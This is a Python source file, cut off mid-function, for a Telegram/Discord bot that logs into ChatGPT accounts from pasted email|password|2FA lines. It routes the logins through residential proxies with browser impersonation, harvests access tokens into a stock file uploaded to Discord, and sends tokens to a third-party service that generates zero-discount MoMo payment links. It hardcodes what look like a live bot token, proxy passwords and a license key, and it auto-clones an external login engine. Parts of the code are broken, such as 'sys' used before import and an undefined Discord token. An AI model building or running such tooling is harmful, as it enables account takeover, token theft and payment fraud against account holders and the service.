import subprocess

# --- AUTO-DEPENDENCY INSTALLER ---
def _ensure_package(pkg_name, import_name=None):
    import_name = import_name or pkg_name
    try:
        __import__(import_name)
    except ImportError:
        print(f"Installing missing dependency: {pkg_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name])

for _pkg, _imp in [("aiohttp", "aiohttp"), ("curl_cffi", "curl_cffi"), ("pyotp", "pyotp"), ("pydantic", "pydantic")]:
    _ensure_package(_pkg, _imp)

import asyncio
import aiohttp
import os
import sys
import logging
import time
import uuid
import json
import re

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8962049506:AAFxHSnEeFUIsxOLNl-iRmBO9S5gfV_JbOQ")
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PUPUX_API_BASE = "https://jack-exlink.hjm06.lol"
PROXY_POOL = [
    "http://fsie739745-region-VN-sid-VaQ5btTy-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-emeQQSyt-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-GJrpQmiE-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-wCssZPcu-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-BAwskRbA-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-YhDqqny5-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-bqsj18zk-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-1ukDvAbg-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-yi3XHC8q-t-120:snojrd95@us.1024proxy.io:3000",
    "http://fsie739745-region-VN-sid-35ricWBQ-t-120:snojrd95@us.1024proxy.io:3000"
]
EXLINK_PROXIES = [
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-VaQ5btTy-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-emeQQSyt-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-GJrpQmiE-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-wCssZPcu-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-BAwskRbA-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-YhDqqny5-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-bqsj18zk-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-1ukDvAbg-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-yi3XHC8q-t-120:snojrd95",
    "us.1024proxy.io:3000:fsie739745-region-VN-sid-35ricWBQ-t-120:snojrd95"
]
PROXY_URL = PROXY_POOL[0]
TOKEN_LIMIT = int(os.getenv("TOKEN_LIMIT", "10"))
PAYMENT_METHOD = "momo"  # Hardcoded to MoMo pay
ACTIVE_CDK = os.getenv("ACTIVE_CDK", "CDK-GIVPJXPCKVC9G7BDDGMJ2SOW")
AUTHORIZED_WORKERS = {"sleepu69", "royfumbler"}  # Initial authorized admins (lowercase)
STOCK_FILE = "token_stock.txt"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

import random
from curl_cffi.requests import AsyncSession

# --- AUTO-AUTHENTICATION ENGINE LOADER ---
repo_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "upi-vippro-tool-api")
if not os.path.exists(os.path.join(repo_dir, "app", "login_service.py")):
    logger.info("[Auto-Setup] Missing upi-vippro-tool-api engine. Cloning from GitHub...")
    try:
        subprocess.check_call(["git", "clone", "https://github.com/6c696e68/upi-vippro-tool-api.git", repo_dir])
    except Exception as _clone_err:
        logger.error(f"[Auto-Setup] Failed to clone upi-vippro-tool-api: {_clone_err}")

if repo_dir not in sys.path:
    sys.path.append(repo_dir)

try:
    from app.login_service import login_pure_request, LoginError  # type: ignore # pyright: ignore[reportMissingImports]
except Exception as err:
    logger.warning(f"Could not import login_service: {err}")

async def login_account_credential(cred_str):
    cred_str = cred_str.strip()
    if not cred_str:
        return None, "free", "Empty string"

    parts = re.split(r'[|:]', cred_str)
    if len(parts) < 2:
        return None, "free", "Invalid format. Use email|pass|2fa"

    email = parts[0].strip()
    password = parts[1].strip()
    totp_secret = parts[2].strip() if len(parts) >= 3 and parts[2].strip() else None

    # Try up to 3 random proxies from the pool on network/TLS errors
    proxies_to_try = random.sample(PROXY_POOL, min(len(PROXY_POOL), 3))
    last_err = "Unknown login error"

    for attempt, active_proxy in enumerate(proxies_to_try, 1):
        logger.info(f"[Pure-HTTP Auth] (Attempt {attempt}/{len(proxies_to_try)}) Logging in {email} via Proxy ({active_proxy.split('@')[-1]})...")
        try:
            async with AsyncSession(impersonate="safari15_5", proxy=active_proxy, timeout=25) as session:
                session_entry = await login_pure_request(email, password, totp_secret, session, logger)
                if session_entry and session_entry.access_token:
                    # Detect subscription plan (Plus vs Free)
                    plan = "free"
                    try:
                        r = await session.get(
                            "https://chatgpt.com/api/auth/session",
                            headers={"Accept": "application/json", "Referer": "https://chatgpt.com/"}
                        )
                        if r.status_code == 200:
                            data = r.json()
                            p = (data.get("subscription_plan") or (data.get("account") or {}).get("planType") or "").lower()
                            if p in ("chatgptplusplan", "plus") or "plus" in p:
                                plan = "plus"
                            elif "team" in p:
                                plan = "team"
                            elif "pro" in p:
                                plan = "pro"
                    except Exception as plan_err:
                        logger.warning(f"Plan detection failed for {email}: {plan_err}")

                    logger.info(f"[Pure-HTTP Auth] Access Token generated for {email} (Plan: {plan})!")
                    return session_entry.access_token, plan, f"Logged in: `{email}` ({plan.upper()})"
        except Exception as le:
            last_err = str(le)
            logger.warning(f"[Pure-HTTP Auth] Attempt {attempt} failed for {email} via {active_proxy.split('@')[-1]}: {le}")
            # If explicit auth error (wrong password/MFA), don't retry other proxies
            err_lower = last_err.lower()
            if "invalid" in err_lower or "password" in err_lower or "credentials" in err_lower or "mfa" in err_lower or "wrong" in err_lower:
                return None, "free", f"Login failed for `{email}` ({last_err})"
            await asyncio.sleep(1)

    return None, "free", f"Login failed for `{email}` ({last_err})"

async def process_and_extract_credentials(text, http=None, chat_id=None):
    if not text:
        return []

    tokens = []
    lines = text.splitlines()

    for line in lines:
        line_str = line.strip()
        if not line_str:
            continue

        # 1. Check if line is email|pass|2fa or email:pass:2fa format
        if "@" in line_str and ("|" in line_str or ":" in line_str) and not line_str.startswith("eyJ"):
            parts = re.split(r'[|:]', line_str)
            if len(parts) >= 2:
                email = parts[0].strip()
                if chat_id and http:
                    await send_tg_message(http, chat_id, f"**Authenticating Account** (`{email}`)... Please wait...")

                token, plan, status_msg = await login_account_credential(line_str)
                if token:
                    tokens.append(token)
                    if chat_id and http:
                        if plan.lower() in ("plus", "team", "pro"):
                            await send_tg_message(
                                http, chat_id, 
                                f"`{email}` (**{plan.upper()}**):\n\n"
                                f"Account is already **{plan.upper()}**! Skipped MoMo link extraction."
                            )
                        else:
                            await send_tg_message(
                                http, chat_id, 
                                f"**Authentication Success** (`{email}` | **{plan.upper()}**)\nExtracting MoMo payment link..."
                            )
                            if ACTIVE_CDK:
                                asyncio.create_task(execute_extraction_batch(http, chat_id, [token]))
                            else:
                                await send_tg_message(http, chat_id, "**CDK Key is not set!** Please run `/setcdk YOUR_CDK_KEY` in Telegram to enable MoMo link extraction.")
                else:
                    if chat_id and http:
                        await send_tg_message(http, chat_id, status_msg)
                continue

        # 2. Extract raw JWT tokens starting with eyJ
        jwt_matches = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', line_str)
        for jm in jwt_matches:
            if len(jm) > 50 and jm not in tokens:
                tokens.append(jm)

        # 3. Direct tokens without eyJ prefix
        if len(line_str) > 50 and line_str not in tokens and not line_str.startswith("eyJ"):
            if not ("@" in line_str and ("|" in line_str or ":" in line_str)):
                tokens.append(line_str)

    return tokens

def extract_access_tokens_from_text(text):
    tokens = []
    if not text:
        return tokens
        
    lines = text.splitlines()
    for line in lines:
        line_str = line.strip()
        if not line_str:
            continue

        # 1. Try parsing JSON directly to find "accessToken"
        try:
            data = json.loads(line_str)
            if isinstance(data, dict):
                acc_tok = data.get("accessToken")
                if acc_tok and isinstance(acc_tok, str) and len(acc_tok) > 50:
                    if acc_tok.strip() not in tokens:
                        tokens.append(acc_tok.strip())
                    continue
        except Exception:
            pass
            
        # 2. Search regex for "accessToken": "..." in line
        match = re.search(r'"accessToken"\s*:\s*"([^"]+)"', line_str)
        if match:
            tok = match.group(1).strip()
            if len(tok) > 50 and tok not in tokens:
                tokens.append(tok)
                continue
                
        # 3. Search regex for raw JWT tokens starting with eyJ
        jwt_matches = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', line_str)
        for jm in jwt_matches:
            if len(jm) > 50 and jm not in tokens:
                tokens.append(jm)

    return tokens

def load_stock():
    if not os.path.exists(STOCK_FILE):
        return []
    with open(STOCK_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def save_stock(tokens):
    with open(STOCK_FILE, "w", encoding="utf-8") as f:
        for t in tokens:
            f.write(f"{t}\n")

def get_discord_headers():
    tok = DISCORD_TOKEN.strip()
    if not tok:
        return {}
    if not tok.startswith("Bot "):
        tok = f"Bot {tok}"
    return {"Authorization": tok}

async def push_stock_to_discord_db(http):
    headers = get_discord_headers()
    if not headers or not DISCORD_DB_CHANNEL_ID:
        return
    url = f"https://discord.com/api/v9/channels/{DISCORD_DB_CHANNEL_ID}/messages"
    tokens = load_stock()
    
    content_payload = f"**Token Stock DB Backup** — `{len(tokens)}` unused token(s) in pool."
    
    if not os.path.exists(STOCK_FILE):
        return

    try:
        data = aiohttp.FormData()
        data.add_field("payload_json", json.dumps({"content": content_payload}))
        with open(STOCK_FILE, "rb") as f:
            data.add_field("file", f, filename="token_stock.txt", content_type="text/plain")
            
        async with http.post(url, headers=headers, data=data, timeout=15) as resp:
            if resp.status == 200:
                logger.info(f"[Discord DB] Backed up {len(tokens)} token(s) to Discord DB Channel ({DISCORD_DB_CHANNEL_ID}).")
            else:
                resp_text = await resp.text()
                logger.error(f"[Discord DB] Failed to backup stock: {resp.status} - {resp_text}")
    except Exception as e:
        logger.error(f"[Discord DB] Exception uploading stock to Discord DB: {e}")

async def restore_stock_from_discord_db(http):
    headers = get_discord_headers()
    if not headers or not DISCORD_DB_CHANNEL_ID:
        return
    url = f"https://discord.com/api/v9/channels/{DISCORD_DB_CHANNEL_ID}/messages?limit=10"
    try:
        async with http.get(url, headers=headers, timeout=10) as resp:
            if resp.status == 200:
                msgs = await resp.json()
                if msgs and isinstance(msgs, list):
                    for msg in msgs:
                        attachments = msg.get("attachments", [])
                        for att in attachments:
                            if att.get("filename") == "token_stock.txt" or att.get("url", "").endswith(".txt"):
                                att_url = att.get("url")
                                async with http.get(att_url, timeout=10) as att_resp:
                                    if att_resp.status == 200:
                                        att_text = await att_resp.text()
                                        restored_tokens = extract_access_tokens_from_text(att_text)
                                        if restored_tokens:
                                            save_stock(restored_tokens)
                                            logger.info(f"[Discord DB] Restored {len(restored_tokens)} token(s) from Discord DB Channel!")
                                            return
    except Exception as e:
        logger.error(f"[Discord DB] Error restoring stock from Discord DB: {e}")

def add_to_stock(new_tokens, http=None):
    existing = load_stock()
    existing_set = set(existing)
    added = 0
    for t in new_tokens:
        if t not in existing_set:
            existing.append(t)
            existing_set.add(t)
            added += 1
    save_stock(existing)
    if added > 0 and http:
        asyncio.create_task(push_stock_to_discord_db(http))
    return added, len(existing)

def pop_from_stock(count, http=None):
    existing = load_stock()
    selected = existing[:count]
    remaining = existing[count:]
    save_stock(remaining)
    if http:
        asyncio.create_task(push_stock_to_discord_db(http))
    return selected, len(remaining)

def is_authorized(username):
    if not username:
        return False
    return username.lower().lstrip('@') in AUTHORIZED_WORKERS

async def send_tg_message(http, chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"{TG_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with http.post(url, json=payload) as r:
            res = await r.json()
            if not res.get("ok"):
                payload.pop("parse_mode", None)
                await http.post(url, json=payload)
            return res
    except Exception as e:
        logger.error(f"Failed to send message: {e}")
        return None

async def send_tg_photo(http, chat_id, photo_url, caption="", parse_mode="Markdown"):
    url = f"{TG_API}/sendPhoto"
    try:
        if isinstance(photo_url, str) and photo_url.startswith("data:image"):
            import base64
            import io
            header, encoded = photo_url.split(",", 1)
            img_data = base64.b64decode(encoded)
            form = aiohttp.FormData()
            form.add_field("chat_id", str(chat_id))
            if caption:
                form.add_field("caption", caption)
                form.add_field("parse_mode", parse_mode)
            form.add_field("photo", io.BytesIO(img_data), filename="momo_qr.png", content_type="image/png")
            async with http.post(url, data=form) as r:
                return await r.json()
        else:
            payload = {"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": parse_mode}
            async with http.post(url, json=payload) as r:
                res = await r.json()
                if not res.get("ok"):
                    await send_tg_message(http, chat_id, f"{caption}\n\nQR Image: {photo_url}")
                return res
    except Exception as e:
        logger.error(f"Failed to send photo: {e}")
        await send_tg_message(http, chat_id, f"{caption}\n\nQR Image: {photo_url}")

async def edit_tg_message(http, chat_id, message_id, text, parse_mode="Markdown"):
    url = f"{TG_API}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    try:
        async with http.post(url, json=payload) as r:
            res = await r.json()
            if not res.get("ok"):
                payload.pop("parse_mode", None)
                await http.post(url, json=payload)
            return res
    except Exception as e:
        logger.error(f"Failed to edit message: {e}")

async def extract_momo_via_ws(http, chat_id, token, cdk_to_use, status_msg_id=None):
    ws_url = "wss://jack-exlink.hjm06.lol/api/v1/ws"
    req_id = str(uuid.uuid4())
    submit_payload = {
        "type": "submit",
        "request_id": req_id,
        "data": {
            "access_token": token,
            "payment_method": "momo",
            "discount_strategy": "zero",
            "proxy_mode": "manual",
            "proxy_type": "http",
            "proxies": EXLINK_PROXIES,
            "checkout_country": "VN",
            "checkout_currency": "VND",
            "proxy_country": "VN",
            "retry_count": 8,
            "cdk": cdk_to_use
        }
    }

    try:
        async with http.ws_connect(ws_url, heartbeat=20) as ws:
            # Send initial ping
            await ws.send_str(json.dumps({"type": "ping", "request_id": str(uuid.uuid4()), "data": {}}))
            
            # Send submit
            logger.info(f"[MoMo WS] Submitting extraction task {req_id[:8]} with CDK {cdk_to_use[:6]}...")
            await ws.send_str(json.dumps(submit_payload))

            link_url = None
            qr_sent = False
            start_t = time.time()

            while time.time() - start_t < 240:
                try:
                    msg = await asyncio.wait_for(ws.receive(), timeout=25)
                except asyncio.TimeoutError:
                    # Send keepalive ping
                    await ws.send_str(json.dumps({"type": "ping", "request_id": str(uuid.uuid4()), "data": {}}))
                    continue

                if msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                    logger.error(f"[MoMo WS] WebSocket closed: {msg}")
                    break

                try:
                    event_data = json.loads(msg.data)
                except Exception:
                    continue

                m_type = event_data.get("type")
                m_req_id = event_data.get("request_id")

                if m_type in ("status", "announcement", "pong"):
                    continue

                if m_req_id and m_req_id != req_id:
                    continue

                if m_type == "accepted":
                    task_tok = event_data.get("task_token")
                    logger.info(f"[MoMo WS] Task accepted: {task_tok}")
                    if status_msg_id:
                        await edit_tg_message(http, chat_id, status_msg_id, "⏳ **Task Accepted** — Generating MoMo link via Vietnam proxy...")

                elif m_type == "error":
                    err_msg = event_data.get("message") or event_data.get("detail") or "Submission error"
                    logger.error(f"[MoMo WS] Error: {err_msg}")
                    await send_tg_message(http, chat_id, f"❌ **MoMo Extraction Error**:\n`{err_msg}`")
                    return False

                elif m_type == "event":
                    ev = event_data.get("event")
                    d = event_data.get("data") or {}

                    if ev == "queue_status":
                        pos = d.get("position", 0)
                        st = d.get("status", "running")
                        if status_msg_id and st == "queued":
                            await edit_tg_message(http, chat_id, status_msg_id, f"⏳ **Task Queued (Position #{pos})**...")

                    elif ev == "log":
                        log_line = d.get("message", "")
                        logger.info(f"[MoMo WS Log] {log_line}")
                        if status_msg_id and log_line:
                            try:
                                await edit_tg_message(http, chat_id, status_msg_id, f"⏳ **Extracting MoMo Link...**\n_{log_line[:120]}_")
                            except Exception:
                                pass

                    elif ev == "link_ready":
                        link_url = d.get("url")
                        logger.info(f"[MoMo WS] link_ready: {link_url}")
                        if link_url:
                            await send_tg_message(http, chat_id, f"🇻🇳 **MoMo Payment Link Ready**:\n`{link_url}`")

                    elif ev == "momo_qr":
                        qr_sent = True
                        qr_img = d.get("qr_image_url") or d.get("image_url") or d.get("qr_url") or d.get("url")
                        redirect_url = d.get("redirect_url") or d.get("url") or link_url
                        logger.info(f"[MoMo WS] momo_qr received: {d}")
                        caption = "🇻🇳 **MoMo QR Code (Vietnam)**"
                        if redirect_url:
                            caption += f"\n\n🔗 **Payment Link**:\n`{redirect_url}`"
                        if qr_img:
                            await send_tg_photo(http, chat_id, qr_img, caption=caption)
                        else:
                            await send_tg_message(http, chat_id, caption)
                        return True

                    elif ev == "done":
                        logger.info(f"[MoMo WS] done event: {d}")
                        if qr_sent:
                            return True
                        # MoMo QR may arrive right after done; wait up to 10 seconds for it
                        if link_url:
                            for _ in range(5):
                                try:
                                    extra_msg = await asyncio.wait_for(ws.receive(), timeout=2.0)
                                    if extra_msg.type == aiohttp.WSMsgType.TEXT:
                                        ex_data = json.loads(extra_msg.data)
                                        if ex_data.get("event") == "momo_qr":
                                            ex_d = ex_data.get("data") or {}
                                            qr_img = ex_d.get("qr_image_url") or ex_d.get("image_url") or ex_d.get("qr_url") or ex_d.get("url")
                                            r_url = ex_d.get("redirect_url") or ex_d.get("url") or link_url
                                            caption = "🇻🇳 **MoMo QR Code (Vietnam)**"
                                            if r_url:
                                                caption += f"\n\n🔗 **Payment Link**:\n`{r_url}`"
                                            if qr_img:
                                                await send_tg_photo(http, chat_id, qr_img, caption=caption)
                                            return True
                                except Exception:
                                    pass
                            return True
                        else:
                            reason = d.get("reason", "Task completed without link")
                            await send_tg_message(http, chat_id, f"❌ **MoMo Extraction Failed**:\n`{reason}`")
                            return False

    except Exception as e:
        logger.error(f"[MoMo WS] Connection exception: {e}")
        await send_tg_message(http, chat_id, f"❌ **MoMo WebSocket Error**: `{e}`")
        return False

    if not link_url and not qr_sent:
        await send_tg_message(http, chat_id, "⏱️ **Extraction Timed Out** (No link produced within 4 minutes)")
        return False
    return True

async def execute_extraction_batch(http, chat_id, tokens, cdk_override=None):
    global ACTIVE_CDK

    cdk_to_use = cdk_override or ACTIVE_CDK
    if not cdk_to_use:
        await send_tg_message(http, chat_id, "🔑 **CDK Key Required!**\nPlease enter your CDK key using `/setcdk YOUR_CDK_KEY` or provide it in `/run email|pass|2fa YOUR_CDK`.")
        return

    init_res = await send_tg_message(
        http, chat_id,
        f"🇻🇳 **Starting MoMo Link Extraction for {len(tokens)} token(s)...**\n"
        f"CDK: `{cdk_to_use[:6]}...`"
    )
    status_msg_id = init_res.get("result", {}).get("message_id") if init_res else None

    success_count = 0
    for tok in tokens:
        ok = await extract_momo_via_ws(http, chat_id, tok, cdk_to_use, status_msg_id)
        if ok:
            success_count += 1

    final_msg = f"**Completed! Delivered {success_count}/{len(tokens)} MoMo Link(s).**"
    if status_msg_id:
        await edit_tg_message(http, chat_id, status_msg_id, final_msg)
    else:
        await send_tg_message(http, chat_id, final_msg)

async def handle_update(http, update):
    global ACTIVE_CDK, AUTHORIZED_WORKERS, LAST_TG_CHAT_ID

    message = update.get("message") or update.get("edited_message")
    if not message:
        return

    chat_id = message.get("chat", {}).get("id")
    if chat_id:
        LAST_TG_CHAT_ID = chat_id
    text = message.get("text", "").strip()
    from_user = message.get("from", {})
    username = from_user.get("username", "")

    if not text or not chat_id:
        return

    # Enforce strict user authorization for ALL bot interactions
    if not is_authorized(username):
        await send_tg_message(http, chat_id, "Access Denied: Only authorized users can use this bot. Contact @Sleepu69 for access.")
        return

    # Command Handling
    cmd = text.split()[0].lower() if text else ""

    if cmd == "/start":
        welcome_text = (
            "🇻🇳 **MoMo Instant Link Extractor (Vietnam)**\n\n"
            "**Quick MoMo Link Generation**:\n"
            "• Simply paste `email|password|2fa_secret` or send `/run email|password|2fa_secret`!\n"
            "• Pure-HTTP authenticates in 1-2s and delivers your **MoMo Payment Link & QR Code** directly!\n\n"
            "**Commands**:\n"
            "• `/run <email|pass|2fa>` — Extract MoMo Payment Link & QR directly\n"
            "• `/check <email|pass|2fa>` — Check account plan (Plus/Free) & get Access Token (0 CDK cost)\n"
            "• `/setcdk <CDK_KEY>` — Set active CDK License Key\n"
            "• `/status` — View bot configuration & CDK quota stats\n"
            "• `/adduser <@username>` — Authorize a new user\n"
            "• `/removeuser <@username>` — Revoke a user's access"
        )
        await send_tg_message(http, chat_id, welcome_text)
        return

    if cmd == "/status":
        cdk_display = f"`{ACTIVE_CDK}`" if ACTIVE_CDK else "*Not Set* (Use `/setcdk <KEY>`)"
        workers_str = ", ".join([f"@{w}" for w in AUTHORIZED_WORKERS]) if AUTHORIZED_WORKERS else "None"
        
        cdk_info_text = ""
        if ACTIVE_CDK:
            try:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Content-Type": "application/json"}
                async with http.post(f"{PUPUX_API_BASE}/api/cdks/balance", json={"code": ACTIVE_CDK}, headers=headers, timeout=10) as cdk_resp:
                    if cdk_resp.status == 200:
                        cdk_res = await cdk_resp.json()
                        rem = cdk_res.get("remaining_points", "N/A")
                        cdk_info_text = (
                            f"\n**CDK Balance**:\n"
                            f"• Remaining Points: `{rem}`\n"
                        )
                    else:
                        cdk_info_text = f"\n**CDK Status**: HTTP {cdk_resp.status}\n"
            except Exception as cdk_err:
                logger.warning(f"Failed to fetch CDK status: {cdk_err}")

        msg = (
            "**Bot Configuration Status**\n\n"
            f"**API Provider**: `https://jack-exlink.hjm06.lol` (ExLink WebSocket)\n"
            f"**Payment Method**: `momo` (Vietnam 🇻🇳)\n"
            f"**Active CDK Key**: {cdk_display}\n"
            f"**Authorized Users**: {workers_str}\n"
            f"{cdk_info_text}"
        )
        await send_tg_message(http, chat_id, msg)
        return

    if cmd == "/setcdk":
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await send_tg_message(http, chat_id, "**Usage**: `/setcdk <YOUR_CDK_KEY>`")
            return
        ACTIVE_CDK = parts[1].strip()
        await send_tg_message(http, chat_id, f"**CDK Key Updated Successfully!**\nNew CDK: `{ACTIVE_CDK}`")
        return

    if cmd in ["/check", "/chk"]:
        parts = text.split(maxsplit=1)
        raw_arg = parts[1] if len(parts) > 1 else ""
        
        reply_to = message.get("reply_to_message")
        if not raw_arg and reply_to:
            raw_arg = reply_to.get("text", "")

        if not raw_arg:
            await send_tg_message(http, chat_id, "**Account Plan Checker Mode**\nPlease paste `email|pass|2fa` right after `/check` or reply to a message containing credentials with `/check`.")
            return

        lines = raw_arg.splitlines()
        for line in lines:
            line_str = line.strip()
            if "@" in line_str and ("|" in line_str or ":" in line_str) and not line_str.startswith("eyJ"):
                parts_cred = re.split(r'[|:]', line_str)
                email = parts_cred[0].strip()
                await send_tg_message(http, chat_id, f"**Checking Account Plan** (`{email}`)... Please wait...")

                token, plan, status_msg = await login_account_credential(line_str)
                if token:
                    msg = (
                        f"**Account Check Result**\n\n"
                        f"**Email**: `{email}`\n"
                        f"**Plan**: **{plan.upper()}**"
                    )
                    await send_tg_message(http, chat_id, msg)
                else:
                    await send_tg_message(http, chat_id, f"**Check Failed**: {status_msg}")
        return

    if cmd in ["/addworker", "/adduser"]:
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await send_tg_message(http, chat_id, "**Usage**: `/adduser <@username>`")
            return
        un = parts[1].strip().lstrip('@').lower()
        AUTHORIZED_WORKERS.add(un)
        await send_tg_message(http, chat_id, f"**Authorized User Added!**\n@{un} can now use the bot.")
        return

    if cmd in ["/removeworker", "/removeuser"]:
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await send_tg_message(http, chat_id, "**Usage**: `/removeuser <@username>`")
            return
        un = parts[1].strip().lstrip('@').lower()
        AUTHORIZED_WORKERS.discard(un)
        await send_tg_message(http, chat_id, f"**User Authorization Revoked!**\n@{un} can no longer use the bot.")
        return

    if cmd == "/run":
        parts = text.split(maxsplit=1)
        raw_arg = parts[1] if len(parts) > 1 else ""
        
        reply_to = message.get("reply_to_message")
        if not raw_arg and reply_to:
            raw_arg = reply_to.get("text", "")

        if not raw_arg:
            await send_tg_message(http, chat_id, "**Usage**: `/run email|password|2fa_secret`\nOr reply to an `email|password|2fa_secret` message with `/run`!")
            return

        tokens = await process_and_extract_credentials(raw_arg, http=http, chat_id=chat_id)
        if not tokens:
            await send_tg_message(http, chat_id, "**Could not process credentials.** Please format as: `email|password|2fa_secret`")
            return
            
        return

    # Direct credential paste (email|pass|2fa) from anyone automatically processes & generates QR code
    if "@" in text and ("|" in text or ":" in text) and not text.startswith("eyJ"):
        tokens = await process_and_extract_credentials(text, http=http, chat_id=chat_id)
        return
        
    # Direct token paste
    tokens = [line.strip() for line in text.splitlines() if line.strip().startswith("eyJ") or len(line.strip()) > 50]
    if tokens:
        added, total_stock = add_to_stock(tokens, http=http)
        await send_tg_message(
            http, chat_id, 
            f"**{added} Access Token(s) Received & Saved to Stock!**\n"
            f"Total Unused Stock: `{total_stock}` token(s)."
        )

async def maintain_discord_presence(http):
    if not DISCORD_TOKEN:
        return
        
    raw_token = DISCORD_TOKEN.strip()
    clean_token = raw_token[4:].strip() if raw_token.startswith("Bot ") else raw_token

    gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
    logger.info("[Discord Presence] Starting Gateway connection to turn Bot Online ...")

    while True:
        try:
            async with http.ws_connect(gateway_url) as ws:
                logger.info("[Discord Presence] Connected to Discord Gateway! Bot is now ONLINE.")
                
                # Identify Payload
                identify_payload = {
                    "op": 2,
                    "d": {
                        "token": clean_token,
                        "intents": 512,
                        "properties": {
                            "$os": "linux",
                            "$browser": "python",
                            "$device": "python"
                        },
                        "presence": {
                            "status": "online",
                            "afk": False,
                            "activities": [{
                                "name": "Session Auto Sync",
                                "type": 0
                            }]
                        }
                    }
                }
                await ws.send_json(identify_payload)

                # Keep heartbeat loop
                while not ws.closed:
                    msg = await ws.receive()
                    if msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                        break
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        data = json.loads(msg.data)
                        op = data.get("op")
                        if op == 10:  # Hello
                            interval_ms = data.get("d", {}).get("heartbeat_interval", 41250)
                            asyncio.create_task(send_gateway_heartbeats(ws, interval_ms / 1000.0))
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"[Discord Presence] Gateway reconnecting: {e}")
            await asyncio.sleep(5)

async def send_gateway_heartbeats(ws, interval_sec):
    try:
        while not ws.closed:
            await asyncio.sleep(interval_sec)
            if not ws.closed:
                await ws.send_json({"op": 1, "d": None})
    except Exception:
        pass

async def poll_discord_channel(http):
    global LAST_DISCORD_MSG_ID
    headers = get_discord_headers()
    if not headers or not DISCORD_INPUT_CHANNEL_ID:
        logger.info("[Discord Sync] DISCORD_TOKEN or DISCORD_INPUT_CHANNEL_ID not set. Polling disabled.")
        return

    logger.info(f"[Discord Sync] Starting background listener for Discord Input Channel {DISCORD_INPUT_CHANNEL_ID} (2s interval)...")
    url = f"https://discord.com/api/v9/channels/{DISCORD_INPUT_CHANNEL_ID}/messages?limit=10"
    
    # Baseline fetch & extract recent messages
    try:
        async with http.get(url, headers=headers, timeout=10) as resp:
            if resp.status == 200:
                msgs = await resp.json()
                if msgs and isinstance(msgs, list):
                    LAST_DISCORD_MSG_ID = msgs[0].get("id")
                    logger.info(f"[Discord Sync] Baseline Message ID: {LAST_DISCORD_MSG_ID}")
                    
                    # Process initial recent messages
                    msgs.sort(key=lambda m: int(m.get("id", 0)))
                    for msg in msgs:
                        content = msg.get("content", "")
                        author = msg.get("author", {}).get("username", "Unknown")
                        attachments = msg.get("attachments", [])
                        for att in attachments:
                            att_url = att.get("url")
                            filename = att.get("filename", "").lower()
                            if att_url and (filename.endswith(".txt") or filename.endswith(".json") or "text" in att.get("content_type", "")):
                                try:
                                    async with http.get(att_url, timeout=10) as att_resp:
                                        if att_resp.status == 200:
                                            att_text = await att_resp.text()
                                            content += f"\n{att_text}"
                                except Exception as att_err:
                                    logger.error(f"[Discord Sync] Attachment fetch error: {att_err}")

                        extracted = await process_and_extract_credentials(content, http=http)
                        if extracted:
                            added, total_stock = add_to_stock(extracted, http=http)
                            logger.info(f"[Discord Sync] Extracted {added} token(s) from Discord (@{author}). Total stock: {total_stock}")

    except Exception as e:
        logger.error(f"[Discord Sync] Initial fetch error: {e}")

    while True:
        await asyncio.sleep(2)  # Fast 2-second polling interval
        try:
            poll_url = url
            if LAST_DISCORD_MSG_ID:
                poll_url = f"{url}&after={LAST_DISCORD_MSG_ID}"
                
            async with http.get(poll_url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    msgs = await resp.json()
                    if msgs and isinstance(msgs, list):
                        # Sort oldest to newest
                        msgs.sort(key=lambda m: int(m.get("id", 0)))
                        for msg in msgs:
                            msg_id = msg.get("id")
                            content = msg.get("content", "")
                            author = msg.get("author", {}).get("username", "Unknown")
                            
                            # Also check text attachments (.txt, .json, etc.)
